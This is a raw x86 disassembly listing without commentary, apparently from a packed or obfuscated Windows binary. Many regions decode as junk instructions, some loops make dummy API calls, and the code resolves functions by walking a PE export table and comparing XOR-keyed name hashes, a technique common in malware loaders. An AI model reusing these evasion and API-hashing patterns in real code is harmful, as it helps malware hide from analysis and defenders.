  41a08c:	pop    ss
  41a08d:	xchg   esi,eax
  41a08e:	rep ins BYTE PTR es:[edi],dx
  41a090:	xor    al,0xb5
  41a092:	aad    0x4b
  41a094:	fnstsw WORD PTR [edx+0x7]
  41a097:	xor    ebx,DWORD PTR [eax]
  41a099:	cld    
  41a09a:	adc    bl,BYTE PTR [eax+eiz*1-0x262ca2ce]
  41a0a1:	cmp    eax,0x9ff93247
  41a0a6:	and    ch,BYTE PTR [ecx]
  41a0a8:	and    DWORD PTR [ebx+0x244bcfa1],ecx
  41a0ae:	loopne 0x41a03e
  41a0b0:	push   ecx
  41a0b1:	out    0x6f,al
  41a0b3:	xchg   ecx,eax
  41a0b4:	les    esi,FWORD PTR [ecx-0x784e70ab]
  41a0ba:	retf   0xfa33
  41a0bd:	outs   dx,BYTE PTR ds:[esi]
  41a0be:	shld   DWORD PTR [ebp+0x4d52bee1],esi,cl
  41a0c5:	cmc    
  41a0c6:	and    ah,bl
  41a0c8:	xchg   edi,eax
  41a0c9:	xor    al,0x4c
  41a0cb:	sbb    esi,DWORD PTR [ebp-0x10]
  41a0ce:	cld    
  41a0cf:	mov    ds:0x422add88,al
  41a0d4:	lea    edx,[eax+ebx*1+0x5b]
  41a0d8:	shl    DWORD PTR [edx+edi*4+0x496732e7],1
  41a0df:	or     al,0xc9
  41a0e1:	(bad)  
  41a0e2:	lods   al,BYTE PTR ds:[esi]
  41a0e3:	inc    edi
  41a0e4:	pushf  
  41a0e5:	fmul   QWORD PTR [ebx+0x1acf29c0]
  41a0eb:	je     0x41a10c
  41a0ed:	or     BYTE PTR [edi+ebx*8-0x6fb63eb7],bl
  41a0f4:	cmp    cl,ah
  41a0f6:	aad    0x36
  41a0f8:	cld    
  41a0f9:	xor    ebx,DWORD PTR [eax+0x31dc8b6f]
  41a0ff:	mov    edx,edx
  41a101:	mov    edx,0xcf0b626
  41a106:	jno    0x41a09c
  41a108:	test   DWORD PTR [edx+0x5b78ecb6],ebx
  41a10e:	inc    esp
  41a10f:	out    dx,al
  41a110:	idiv   DWORD PTR [ecx-0xc]
  41a113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a114:	dec    edx
  41a115:	fisub  WORD PTR [eax-0x80]
  41a118:	cs je  0x41a11b
  41a11b:	xor    dh,bl
  41a11d:	sub    al,0x73
  41a11f:	xchg   BYTE PTR [eax+0x0],cl
  41a122:	xchg   ecx,eax
  41a123:	imul   ecx,DWORD PTR [ebp+0x4214b7a0],0xffffff9e
  41a12a:	cmp    dl,BYTE PTR [edx]
  41a12c:	xchg   esi,eax
  41a12d:	adc    esp,DWORD PTR [eax]
  41a12f:	(bad)  
  41a130:	jbe    0x41a158
  41a132:	scas   eax,DWORD PTR es:[edi]
  41a133:	stc    
  41a134:	mov    ebp,0x459d58e6
  41a139:	jge    0x41a141
  41a13b:	fld    QWORD PTR [edi+0x4d8c5494]
  41a141:	mov    ch,0xd2
  41a143:	push   ebp
  41a144:	sbb    DWORD PTR [ebp+0x71],edi
  41a147:	jg     0x41a10e
  41a149:	dec    esp
  41a14a:	sahf   
  41a14b:	jecxz  0x41a157
  41a14d:	push   edx
  41a14e:	sbb    al,0xd1
  41a150:	pop    ds
  41a151:	mov    eax,ds:0x5591d9e1
  41a156:	rcr    bh,0x8b
  41a159:	inc    ebx
  41a15a:	mov    eax,ds:0xc1369455
  41a15f:	scas   al,BYTE PTR es:[edi]
  41a160:	fidiv  DWORD PTR [esi-0x10]
  41a163:	mov    DWORD PTR [edi],ebx
  41a165:	cli    
  41a166:	xlat   BYTE PTR ds:[ebx]
  41a167:	xor    esi,DWORD PTR [edi+ebp*1-0x64]
  41a16b:	jg     0x41a1c6
  41a16d:	retf   
  41a16e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a16f:	push   edx
  41a170:	cli    
  41a171:	fwait
  41a172:	shl    BYTE PTR [esp+ecx*1-0x660a79b7],0x22
  41a17a:	cmp    al,BYTE PTR [ebx-0x57]
  41a17d:	push   eax
  41a17e:	es stos BYTE PTR es:[edi],al
  41a180:	sub    eax,0xd1a814eb
  41a185:	fisttp WORD PTR [ecx-0xe90a270]
  41a18b:	add    al,0xa4
  41a18d:	cdq    
  41a18e:	idiv   BYTE PTR [esi+eiz*2-0x36]
  41a192:	xor    BYTE PTR [ecx-0x64cf5bf6],ch
  41a198:	xchg   esp,eax
  41a199:	or     ch,BYTE PTR [edi+0x26]
  41a19c:	es test eax,0xed5110f7
  41a1a2:	and    BYTE PTR [ecx+0x5942c289],0x78
  41a1a9:	push   ss
  41a1aa:	xor    al,BYTE PTR [eax]
  41a1ac:	jp     0x41a1a0
  41a1ae:	xor    bl,BYTE PTR [eax+ebp*4-0x2f1a2844]
  41a1b5:	arpl   WORD PTR [bx+si+0x24ad],cx
  41a1ba:	imul   eax,DWORD PTR [eax+0x5f4bacc8],0xffffffbb
  41a1c1:	push   ebp
  41a1c2:	leave  
  41a1c3:	in     eax,dx
  41a1c4:	sub    eax,0x9a6ea578
  41a1c9:	retf   0x4e26
  41a1cc:	inc    ecx
  41a1cd:	stos   BYTE PTR es:[edi],al
  41a1ce:	pop    ds
  41a1cf:	inc    ecx
  41a1d0:	pop    ds
  41a1d1:	pop    ds
  41a1d2:	mov    dh,0xf6
  41a1d4:	or     BYTE PTR [ebx+0xb],dh
  41a1d7:	fsubp  st(7),st
  41a1d9:	pop    es
  41a1da:	dec    DWORD PTR [eax-0x42]
  41a1dd:	mov    ah,0x9
  41a1df:	fs fs lahf 
  41a1e2:	inc    ecx
  41a1e3:	cmp    al,ch
  41a1e5:	repz daa 
  41a1e7:	(bad)  
  41a1e8:	sbb    eax,0x758ccf5e
  41a1ed:	or     DWORD PTR [esi+edi*2+0x32],esi
  41a1f1:	shr    BYTE PTR [ebx+0x13f5a370],1
  41a1f7:	adc    eax,0xbf4f9fc2
  41a1fc:	repz mov al,0x13
  41a1ff:	call   0xe04d:0x8bfc458b
  41a206:	mov    DWORD PTR ds:0x42a7b1,0x1c
  41a210:	cmp    DWORD PTR ds:0x42a7b1,0x0
  41a217:	je     0x41a247
  41a21d:	cmp    DWORD PTR ds:0x42a7b1,0x29
  41a224:	jne    0x41a233
  41a22a:	push   DWORD PTR [ebp-0xc]
  41a22d:	call   DWORD PTR ds:0x41d124
  41a233:	xor    esi,esi
  41a235:	xor    esi,DWORD PTR ds:0x42a7b1
  41a23b:	dec    esi
  41a23c:	mov    DWORD PTR ds:0x42a7b1,esi
  41a242:	jmp    0x41a210
  41a247:	mov    esi,0x7510850
  41a24c:	mov    DWORD PTR ds:0x42a84d,0x3f72
  41a256:	xor    eax,esi
  41a258:	add    eax,ebx
  41a25a:	cmp    ecx,eax
  41a25c:	mov    DWORD PTR ds:0x42a76d,0x752f
  41a266:	je     0x41a678
  41a26c:	push   DWORD PTR [ebp-0x20]
  41a26f:	sub    DWORD PTR ds:0x42a759,0x42a84d
  41a279:	push   DWORD PTR [ebp+0x8]
  41a27c:	call   0x408a76
  41a281:	jmp    0x41a4b6
  41a286:	(bad)  
  41a287:	les    edi,FWORD PTR [edi]
  41a289:	iret   
  41a28a:	rcr    ebx,1
  41a28c:	(bad)  
  41a28d:	leave  
  41a28e:	push   edi
  41a28f:	push   edx
  41a290:	in     al,dx
  41a291:	je     0x41a22f
  41a293:	push   cs
  41a294:	inc    ebx
  41a295:	inc    edx
  41a296:	cwde   
  41a297:	sar    DWORD PTR [edi+0x78],1
  41a29a:	adc    BYTE PTR [esi+0x78],bh
  41a29d:	js     0x41a240
  41a29f:	dec    ecx
  41a2a0:	adc    esp,edi
  41a2a2:	out    0xdb,al
  41a2a4:	or     edx,DWORD PTR [edi]
  41a2a6:	xchg   BYTE PTR [esi],dh
  41a2a8:	sub    BYTE PTR [esi-0x4b],ch
  41a2ab:	js     0x41a23a
  41a2ad:	or     BYTE PTR [ebp+0x9],bh
  41a2b0:	jmp    0xc3f87e5d
  41a2b5:	ins    DWORD PTR es:[edi],dx
  41a2b6:	aaa    
  41a2b7:	sub    edx,DWORD PTR [edx-0x75199a2]
  41a2bd:	mov    ds:0x4c39383c,eax
  41a2c2:	mov    DWORD PTR [ecx+0xa],ebp
  41a2c5:	mov    ds:0x7cecfe28,eax
  41a2ca:	sub    bh,BYTE PTR [edx+0x146f4dff]
  41a2d0:	hlt    
  41a2d1:	and    al,0xf
  41a2d3:	inc    ebx
  41a2d4:	rol    BYTE PTR [ebp-0x786cc510],cl
  41a2da:	fcmove st,st(2)
  41a2dc:	sbb    BYTE PTR [edi],dh
  41a2de:	xchg   esp,eax
  41a2df:	lods   eax,DWORD PTR ds:[esi]
  41a2e0:	fisubr WORD PTR [ebx]
  41a2e2:	hlt    
  41a2e3:	ret    0xc6a
  41a2e6:	add    eax,0x2ac56cb
  41a2eb:	mov    BYTE PTR [ebp+0xf],dl
  41a2ee:	(bad)  [ebx]
  41a2f0:	repz shl BYTE PTR [edx],1
  41a2f3:	std    
  41a2f4:	aas    
  41a2f5:	pop    esi
  41a2f6:	mov    BYTE PTR [edi],ch
  41a2f8:	iret   
  41a2f9:	imul   esp,DWORD PTR [eax+0x71],0x1fca202d
  41a300:	test   DWORD PTR [edi-0x6e9b92d8],edi
  41a306:	mov    ds:0xff2044a2,eax
  41a30b:	loop   0x41a2ee
  41a30d:	cmp    al,0x5a
  41a30f:	sub    al,0x79
  41a311:	test   BYTE PTR [edi],ah
  41a313:	scas   al,BYTE PTR es:[edi]
  41a314:	inc    eax
  41a315:	pop    ebx
  41a316:	stos   BYTE PTR es:[edi],al
  41a317:	cmp    esp,DWORD PTR [edi+edx*2]
  41a31a:	or     bh,0x97
  41a31d:	(bad)  
  41a31e:	or     DWORD PTR [eax+0x4ae6d575],edi
  41a324:	jbe    0x41a371
  41a326:	jmp    0x43fd5c94
  41a32b:	fcomp  DWORD PTR [ebp+0xb66ba4b]
  41a331:	pop    edi
  41a332:	mov    edx,DWORD PTR [edi-0x5270b86a]
  41a338:	test   eax,0xccf4b795
  41a33d:	(bad)  
  41a33e:	daa    
  41a33f:	retf   
  41a340:	or     edx,DWORD PTR ds:0x8aff6cb5
  41a346:	jecxz  0x41a35d
  41a348:	in     eax,0x1
  41a34a:	adc    BYTE PTR [ecx+0x46],cl
  41a34d:	mov    bh,BYTE PTR [ecx+0x36]
  41a350:	push   ebx
  41a351:	adc    dh,BYTE PTR [esi+0x63]
  41a354:	mov    ch,0x8f
  41a356:	sub    ebx,DWORD PTR [esi+0xf433520]
  41a35c:	in     al,0x13
  41a35e:	or     BYTE PTR [esp+ebx*1-0x70],cl
  41a362:	xor    DWORD PTR [edx],eax
  41a364:	lds    ecx,FWORD PTR [ebp-0x56ebfeb2]
  41a36a:	addr16 stc 
  41a36c:	add    BYTE PTR [esi-0x11],0x3a
  41a370:	xchg   DWORD PTR [edi],eax
  41a372:	jbe    0x41a3a0
  41a374:	in     eax,dx
  41a375:	push   ebp
  41a376:	pop    esi
  41a377:	xor    DWORD PTR [edi],0xe74e5408
  41a37d:	call   0x659:0x4396917b
  41a384:	mov    ebp,ebx
  41a386:	ja     0x41a400
  41a388:	pop    edx
  41a389:	gs add al,0x65
  41a38c:	pop    ebx
  41a38d:	shl    BYTE PTR [ebx-0x6b],cl
  41a390:	addr16 mov ebx,0x8305b6f5
  41a396:	push   es
  41a397:	sub    dl,BYTE PTR ds:0x12e735f8
  41a39d:	ds push eax
  41a39f:	dec    ebp
  41a3a0:	fisttp QWORD PTR [esi-0x2f3ea5fb]
  41a3a6:	sbb    al,0x2f
  41a3a8:	call   0xfaf4caab
  41a3ad:	xor    eax,0x69fa99e7
  41a3b2:	les    ecx,FWORD PTR [ecx]
  41a3b4:	mov    BYTE PTR [edi],ah
  41a3b6:	mov    ds:0xcfe00a10,eax
  41a3bb:	cmc    
  41a3bc:	ret    0x373e
  41a3bf:	mov    edx,0x489bccce
  41a3c4:	sti    
  41a3c5:	push   ss
  41a3c6:	nop
  41a3c7:	mov    ebx,0x2af0e3a4
  41a3cc:	call   0x3650:0x9c2ccdc2
  41a3d3:	cmp    eax,0xb4e7713b
  41a3d8:	and    DWORD PTR [ebx-0x49ac3649],edx
  41a3de:	cmp    DWORD PTR [ebx+0x6c],eax
  41a3e1:	loopne 0x41a389
  41a3e3:	jmp    0x41a402
  41a3e5:	or     al,0xe3
  41a3e7:	int    0x33
  41a3e9:	cmp    edx,DWORD PTR ds:0x72b4d25f
  41a3ef:	pusha  
  41a3f0:	lock pop ds
  41a3f2:	icebp  
  41a3f3:	xchg   esp,eax
  41a3f4:	je     0x41a3b0
  41a3f6:	repz repz and BYTE PTR [ecx],dh
  41a3fa:	mov    dl,0x30
  41a3fc:	ficomp DWORD PTR es:[edi]
  41a3ff:	repz scas al,BYTE PTR es:[edi]
  41a401:	pop    ds
  41a402:	call   0x63f0:0x20943ee5
  41a409:	mov    dl,0x4d
  41a40b:	xchg   esi,eax
  41a40c:	aaa    
  41a40d:	pop    ebp
  41a40e:	fucomp st(2)
  41a410:	(bad)  
  41a411:	fucomi st,st(5)
  41a413:	lds    ebp,FWORD PTR [ebp+0x6c86de1f]
  41a419:	pop    ecx
  41a41a:	pop    ebx
  41a41b:	adc    DWORD PTR [edx-0x7a],eax
  41a41e:	mov    eax,ds:0x2c59f359
  41a423:	mov    edx,ds
  41a425:	mov    esi,0x6eabb6b2
  41a42a:	jge    0x41a40c
  41a42c:	sbb    dl,ah
  41a42e:	inc    edi
  41a42f:	adc    al,0x52
  41a431:	sbb    al,0x7b
  41a433:	xchg   bh,dh
  41a435:	cli    
  41a436:	stos   BYTE PTR es:[edi],al
  41a437:	dec    ebp
  41a438:	and    edi,DWORD PTR [edi+0x5baec93e]
  41a43e:	push   ebp
  41a43f:	ja     0x41a496
  41a441:	xchg   DWORD PTR [edx+ebp*2+0x6b],ebp
  41a445:	push   0xa6cb7119
  41a44a:	stc    
  41a44b:	mov    ah,0x73
  41a44d:	push   es
  41a44e:	jmp    0x129d14f5
  41a453:	jg     0x41a402
  41a455:	add    ecx,edi
  41a457:	push   0x60c3eb7c
  41a45c:	xchg   esi,eax
  41a45d:	jmp    0x65627a0f
  41a462:	dec    ebx
  41a463:	retf   0xda3
  41a466:	cmc    
  41a467:	(bad)  [esp+eax*4-0x712b5239]
  41a46e:	mov    bl,0x29
  41a470:	add    al,0xa2
  41a472:	sub    esi,eax
  41a474:	push   ss
  41a475:	xchg   DWORD PTR [ebp+0x5de378d2],ebx
  41a47b:	aad    0x4e
  41a47d:	das    
  41a47e:	sub    eax,0x605f5fbe
  41a483:	out    0x95,al
  41a485:	(bad)  [esi]
  41a487:	(bad)  
  41a488:	out    0x8e,eax
  41a48a:	repz clc 
  41a48c:	rol    ecx,0x83
  41a48f:	test   al,0x6a
  41a491:	shl    BYTE PTR fs:[eax],cl
  41a494:	and    eax,DWORD PTR [edx+eax*8-0x2a]
  41a498:	add    esi,esi
  41a49a:	rcl    DWORD PTR [ecx+eiz*2-0x9],cl
  41a49e:	stc    
  41a49f:	gs sahf 
  41a4a1:	fs inc ecx
  41a4a3:	and    ah,BYTE PTR [ecx+0x26b4f4ba]
  41a4a9:	retf   
  41a4aa:	sahf   
  41a4ab:	cmp    ebx,ecx
  41a4ad:	mov    ds:0x65154164,eax
  41a4b2:	icebp  
  41a4b3:	cld    
  41a4b4:	outs   dx,DWORD PTR ds:[esi]
  41a4b5:	leave  
  41a4b6:	mov    DWORD PTR [ebp-0x14],eax
  41a4b9:	mov    DWORD PTR ds:0x42a75d,0x18
  41a4c3:	cmp    DWORD PTR ds:0x42a75d,0x0
  41a4ca:	je     0x41a5f6
  41a4d0:	cmp    DWORD PTR ds:0x42a75d,0x1a
  41a4d7:	jne    0x41a4e8
  41a4dd:	push   0x3f0b
  41a4e2:	call   DWORD PTR ds:0x41d200
  41a4e8:	mov    eax,ds:0x42a75d
  41a4ed:	dec    eax
  41a4ee:	mov    ds:0x42a75d,eax
  41a4f3:	jmp    0x41a4c3
  41a4f8:	and    DWORD PTR ds:0x42a7f1,0x0
  41a502:	jmp    0x41a512
  41a507:	mov    eax,ds:0x42a7f1
  41a50c:	inc    eax
  41a50d:	mov    ds:0x42a7f1,eax
  41a512:	cmp    DWORD PTR ds:0x42a7f1,0x1f
  41a519:	jae    0x41a5f6
  41a51f:	cmp    DWORD PTR ds:0x42a7f1,0x8
  41a526:	jne    0x41a53f
  41a52c:	push   0x8add
  41a531:	push   0x6acd
  41a536:	push   DWORD PTR [ebp-0x20]
  41a539:	call   DWORD PTR ds:0x41d128
  41a53f:	cmp    DWORD PTR ds:0x42a7f1,0x7
  41a546:	jne    0x41a557
  41a54c:	mov    eax,ds:0x42a7f1
  41a551:	inc    eax
  41a552:	mov    ds:0x42a7f1,eax
  41a557:	jmp    0x41a507
  41a55c:	mov    DWORD PTR ds:0x42a77d,0x11
  41a566:	cmp    DWORD PTR ds:0x42a77d,0x0
  41a56d:	je     0x41a5f6
  41a573:	cmp    DWORD PTR ds:0x42a77d,0x1d
  41a57a:	jne    0x41a58b
  41a580:	push   0x75df
  41a585:	call   DWORD PTR ds:0x41d12c
  41a58b:	mov    eax,ds:0x42a77d
  41a590:	dec    eax
  41a591:	mov    ds:0x42a77d,eax
  41a596:	jmp    0x41a566
  41a59b:	and    DWORD PTR ds:0x42a759,0x0
  41a5a5:	mov    ecx,DWORD PTR ds:0x42a759
  41a5ab:	inc    ecx
  41a5ac:	mov    DWORD PTR ds:0x42a759,ecx
  41a5b2:	cmp    DWORD PTR ds:0x42a759,0xb
  41a5b9:	jne    0x41a5cd
  41a5bf:	push   DWORD PTR [ebp-0x28]
  41a5c2:	push   0x2f79
  41a5c7:	call   DWORD PTR ds:0x41d204
  41a5cd:	cmp    DWORD PTR ds:0x42a759,0xa
  41a5d4:	jne    0x41a5e9
  41a5da:	xor    ecx,ecx
  41a5dc:	add    ecx,DWORD PTR ds:0x42a759
  41a5e2:	inc    ecx
  41a5e3:	mov    DWORD PTR ds:0x42a759,ecx
  41a5e9:	cmp    DWORD PTR ds:0x42a759,0x15
  41a5f0:	jb     0x41a5a5
  41a5f6:	mov    eax,DWORD PTR [ebp-0x4]
  41a5f9:	mov    ecx,DWORD PTR [ebp-0x14]
  41a5fc:	xor    eax,esi
  41a5fe:	add    eax,ebx
  41a600:	cmp    ecx,eax
  41a602:	je     0x41a678
  41a608:	mov    eax,DWORD PTR [ebp-0x14]
  41a60b:	mov    eax,DWORD PTR [eax+0x18]
  41a60e:	mov    DWORD PTR [ebp-0x20],eax
  41a611:	mov    eax,DWORD PTR [ebp-0x14]
  41a614:	mov    ecx,DWORD PTR [ebp+0x8]
  41a617:	add    ecx,DWORD PTR [eax+0x20]
  41a61a:	mov    DWORD PTR [ebp-0x28],ecx
  41a61d:	mov    eax,DWORD PTR [ebp-0x14]
  41a620:	mov    ecx,DWORD PTR [ebp+0x8]
  41a623:	add    ecx,DWORD PTR [eax+0x24]
  41a626:	mov    DWORD PTR [ebp-0x2c],ecx
  41a629:	mov    eax,DWORD PTR [ebp-0x14]
  41a62c:	mov    ecx,DWORD PTR [ebp+0x8]
  41a62f:	add    ecx,DWORD PTR [eax+0x1c]
  41a632:	xor    esi,esi
  41a634:	mov    DWORD PTR [ebp-0x14],ecx
  41a637:	mov    eax,DWORD PTR [ebp-0x28]
  41a63a:	mov    ecx,DWORD PTR [ebp+0x8]
  41a63d:	add    ecx,DWORD PTR [eax+edi*4]
  41a640:	lea    eax,[ebp-0x8]
  41a643:	mov    DWORD PTR [ebp-0x30],ecx
  41a646:	push   eax
  41a647:	push   DWORD PTR [ebp-0x30]
  41a64a:	push   DWORD PTR [ebp+0xc]
  41a64d:	call   0x4068d8
  41a652:	mov    eax,DWORD PTR [ebp-0x4]
  41a655:	mov    ecx,DWORD PTR [ebp-0x8]
  41a658:	xor    eax,0x7510850
  41a65d:	add    eax,ebx
  41a65f:	cmp    ecx,eax
  41a661:	jne    0x41a8b9
  41a667:	mov    eax,DWORD PTR [ebp-0x20]
  41a66a:	inc    edi
  41a66b:	cmp    edi,eax
  41a66d:	jb     0x419d40
  41a673:	jmp    0x41a8c9
  41a678:	mov    eax,DWORD PTR [ebp-0x4]
  41a67b:	xor    eax,esi
  41a67d:	jmp    0x41a8b2
  41a682:	retf   0xccc3
  41a685:	cmp    al,0xd9
  41a687:	rcr    edx,cl
  41a689:	leave  
  41a68a:	mov    esp,gs
  41a68c:	and    al,0x1
  41a68e:	rcr    esi,1
  41a690:	or     BYTE PTR [ecx],ah
  41a692:	mov    al,0xd7
  41a694:	jg     0x41a70e
  41a696:	adc    BYTE PTR [esi+0x78],bh
  41a699:	js     0x41a6ea
  41a69b:	push   ebp
  41a69c:	push   ebp
  41a69d:	or     bh,BYTE PTR [eax-0x51]
  41a6a0:	in     al,dx
  41a6a1:	push   ebp
  41a6a2:	ins    DWORD PTR es:[edi],dx
  41a6a3:	stos   BYTE PTR es:[edi],al
  41a6a4:	fcom   QWORD PTR [ebp+0x54]
  41a6a7:	mov    ah,0x3a
  41a6a9:	push   eax
  41a6aa:	mov    ebx,?
  41a6ac:	dec    ebx
  41a6ad:	lea    ebx,[ecx+0x1ddde827]
  41a6b3:	pop    ebp
  41a6b4:	push   es
  41a6b5:	outs   dx,DWORD PTR ds:[esi]
  41a6b6:	cmp    al,0x99
  41a6b8:	jle    0x41a701
  41a6ba:	sub    DWORD PTR [ebx+0x5c335580],eax
  41a6c0:	pop    edi
  41a6c1:	add    eax,0xc2bab9f0
  41a6c6:	xor    BYTE PTR [esi+0x6],0xf
  41a6ca:	or     ax,0x4995
  41a6ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6cf:	add    cl,al
  41a6d1:	(bad)  
  41a6d2:	lods   al,BYTE PTR ds:[esi]
  41a6d3:	test   BYTE PTR [ebx],cl
  41a6d5:	sbb    bh,BYTE PTR [eax-0x63c8b2de]
  41a6db:	xor    BYTE PTR [edx-0x1e],bh
  41a6de:	mov    ah,0xda
  41a6e0:	scas   al,BYTE PTR es:[edi]
  41a6e1:	(bad)
  41a6e4:	test   BYTE PTR [edx-0xce435bc],ch
  41a6ea:	mov    bl,0x15
  41a6ec:	mov    ds:0x993a4f8b,al
  41a6f1:	push   eax
  41a6f2:	(bad)  
  41a6f3:	shr    BYTE PTR [edx+0x1],1
  41a6f6:	adc    eax,0xb02e90e7
  41a6fb:	repz fidivr DWORD PTR [edx+0x63]
  41a6ff:	xor    eax,edi
  41a701:	sar    dl,cl
  41a703:	push   edi
  41a704:	cld    
  41a705:	outs   dx,DWORD PTR ds:[esi]
  41a706:	jmp    0x1547f255
  41a70b:	fiadd  DWORD PTR [ebx]
  41a70d:	jno    0x41a76e
  41a70f:	xchg   ebp,eax
  41a710:	popf   
  41a711:	sar    DWORD PTR [edi+0x7e],cl
  41a714:	and    eax,0xcdde665e
  41a719:	imul   eax,DWORD PTR [edx+0x5c],0x34618356
  41a720:	fstp   QWORD PTR [ebx-0x71eb681f]
  41a726:	jp     0x41a750
  41a728:	mov    BYTE PTR [esi],ah
  41a72a:	pop    ecx
  41a72b:	dec    eax
  41a72c:	or     BYTE PTR [edx+edi*4],bl
  41a72f:	ret    
  41a730:	arpl   WORD PTR [ecx],ax
  41a732:	test   BYTE PTR [eax-0x635af00],dh
  41a738:	mov    cl,0xf1
  41a73a:	cmc    
  41a73b:	cli    
  41a73c:	(bad)  
  41a73d:	(bad)  
  41a73e:	icebp  
  41a73f:	mov    BYTE PTR [ecx-0x5a],dh
  41a742:	aas    
  41a743:	neg    DWORD PTR [esi+0x4ee6589b]
  41a749:	ss out dx,eax
  41a74b:	add    eax,0x45a275b6
  41a750:	iret   
  41a751:	pusha  
  41a752:	push   ebx
  41a753:	aad    0xb6
  41a755:	sbb    eax,0x289d20d1
  41a75a:	pop    ss
  41a75b:	xor    al,0x62
  41a75d:	into   
  41a75e:	out    0x1b,al
  41a760:	xor    ebp,0x8e1a3c55
  41a766:	adc    ch,ch
  41a768:	sub    DWORD PTR [edi+0x3012d967],edx
  41a76e:	test   al,0xaf
  41a770:	outs   dx,DWORD PTR ds:[esi]
  41a771:	pop    eax
  41a772:	pop    esp
  41a773:	adc    eax,0x333617d4
  41a778:	and    BYTE PTR fs:[esi-0x1a],al
  41a77c:	out    0x8,eax
  41a77e:	test   eax,0xa0b8514e
  41a783:	fcomp  DWORD PTR [edi+0x1b]
  41a786:	inc    ebx
  41a787:	pop    ebx
  41a788:	rcl    BYTE PTR [esi-0x775e5d43],cl
  41a78e:	adc    dh,BYTE PTR [edi-0x30]
  41a791:	push   edi
  41a792:	repnz push edx
  41a794:	clc    
  41a795:	xchg   DWORD PTR [eax+0x29b5de48],edx
  41a79b:	push   0x5558d3fc
  41a7a0:	arpl   WORD PTR [edx-0x105b2997],bx
  41a7a6:	mov    esi,0x6f397ae6
  41a7ab:	jg     0x41a761
  41a7ad:	sbb    eax,0x10dc7dea
  41a7b2:	mov    edi,0x6aade785
  41a7b7:	adc    eax,0xb523ec5c
  41a7bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7bd:	loop   0x41a78e
  41a7bf:	fld    TBYTE PTR [esi]
  41a7c1:	das    
  41a7c2:	loope  0x41a74f
  41a7c4:	jne    0x41a780
  41a7c6:	xor    BYTE PTR [ebx],0xb6
  41a7c9:	out    dx,eax
  41a7ca:	cwde   
  41a7cb:	push   ebx
  41a7cc:	sbb    BYTE PTR [esi],0xf6
  41a7cf:	add    DWORD PTR [ecx],ebp
  41a7d1:	aad    0x15
  41a7d3:	mov    BYTE PTR [eax+0x34fb79a6],dh
  41a7d9:	sub    esi,eax
  41a7db:	lock ss (bad) 
  41a7de:	test   al,0x7
  41a7e0:	fcomi  st,st(2)
  41a7e2:	jmp    0xd56adbef
  41a7e7:	daa    
  41a7e8:	fistp  WORD PTR [edx+ebp*4-0x76c995cc]
  41a7ef:	mov    es:0xac34e59b,al
  41a7f5:	mov    ebx,DWORD PTR [edi+0x6e4719ba]
  41a7fb:	outs   dx,DWORD PTR ds:[esi]
  41a7fc:	and    bl,BYTE PTR [ecx]
  41a7fe:	bt     DWORD PTR [edi],esi
  41a801:	push   edi
  41a802:	sub    ch,BYTE PTR [edi+ecx*1+0x2ebdb6fa]
  41a809:	mov    ebp,0x409fc903
  41a80e:	xchg   edi,eax
  41a80f:	xchg   ebx,eax
  41a810:	dec    esp
  41a811:	sub    eax,DWORD PTR [ecx-0x65]
  41a814:	adc    cl,BYTE PTR [ecx]
  41a816:	dec    ebx
  41a817:	(bad)  
  41a818:	ins    DWORD PTR es:[edi],dx
  41a819:	jge    0x41a85b
  41a81b:	add    ebp,DWORD PTR [ebx-0x16363c92]
  41a821:	xor    BYTE PTR [edx+0x7],bl
  41a824:	mov    esi,0x287210ee
  41a829:	mov    WORD PTR [esi],ss
  41a82b:	imul   ebp,DWORD PTR [edx-0xbb236af],0xffffffe1
  41a832:	sbb    BYTE PTR [esi+0x7b8dbe39],0xfb
  41a839:	and    BYTE PTR [eax],bl
  41a83b:	sbb    eax,0x16c0e0fd
  41a840:	add    DWORD PTR [edi+0x1e],edx
  41a843:	popa   
  41a844:	fs test al,0xb2
  41a847:	scas   eax,DWORD PTR es:[edi]
  41a848:	out    0x47,eax
  41a84a:	(bad)  
  41a84c:	mov    dl,0xf7
  41a84e:	std    
  41a84f:	scas   al,BYTE PTR es:[edi]
  41a850:	out    dx,eax
  41a851:	mov    BYTE PTR [eax+0x62],ah
  41a854:	and    eax,0x809af084
  41a859:	push   0xe
  41a85b:	jno    0x41a829
  41a85d:	push   cs
  41a85e:	popa   
  41a85f:	mov    eax,ds:0x66162fe5
  41a864:	lds    esp,FWORD PTR [edx+0x5c5abbe3]
  41a86a:	icebp  
  41a86b:	fsub   st,st(2)
  41a86d:	pop    es
  41a86e:	push   0x366c31d2
  41a873:	shl    DWORD PTR [edi+0x7803b245],cl
  41a879:	and    BYTE PTR [edx],ch
  41a87b:	jns    0x41a8be
  41a87d:	sub    cl,BYTE PTR ds:0x2b6e9760
  41a883:	sub    BYTE PTR ds:0x56c5f7eb,bh
  41a889:	mov    ah,0x7f
  41a88b:	pop    ebp
  41a88c:	bound  edi,QWORD PTR [ebx-0x35e2cc98]
  41a892:	add    edx,ecx
  41a894:	dec    ecx
  41a895:	test   al,0x81
  41a897:	inc    esp
  41a898:	or     ch,BYTE PTR [ecx]
  41a89a:	out    dx,al
  41a89b:	cmp    DWORD PTR [eax],eax
  41a89d:	dec    esi
  41a89e:	hlt    
  41a89f:	inc    edx
  41a8a0:	push   ebx
  41a8a1:	jnp    0x41a898
  41a8a3:	imul   eax,DWORD PTR fs:[ecx+0x24],0x98280499
  41a8ab:	cmp    al,0x25
  41a8ad:	aaa    
  41a8ae:	adc    DWORD PTR [edi],eax
  41a8b0:	and    dl,0x3
  41a8b3:	ret    
  41a8b4:	jmp    0x41c8fd
  41a8b9:	mov    eax,DWORD PTR [ebp-0x2c]
  41a8bc:	movzx  eax,WORD PTR [eax+edi*2]
  41a8c0:	mov    ecx,DWORD PTR [ebp-0x14]
  41a8c3:	mov    eax,DWORD PTR [ecx+eax*4]
  41a8c6:	mov    DWORD PTR [ebp+0xc],eax
  41a8c9:	mov    eax,DWORD PTR [ebp-0x4]
  41a8cc:	mov    ecx,DWORD PTR [ebp-0x8]
  41a8cf:	xor    eax,0x7510850
  41a8d4:	add    eax,ebx
  41a8d6:	cmp    ecx,eax
  41a8d8:	jne    0x41a8eb
  41a8de:	mov    eax,DWORD PTR [ebp-0x4]
  41a8e1:	xor    eax,0x7510850
  41a8e6:	jmp    0x41a8b2
  41a8eb:	mov    eax,DWORD PTR [ebp+0xc]
  41a8ee:	add    eax,DWORD PTR [ebp+0x8]
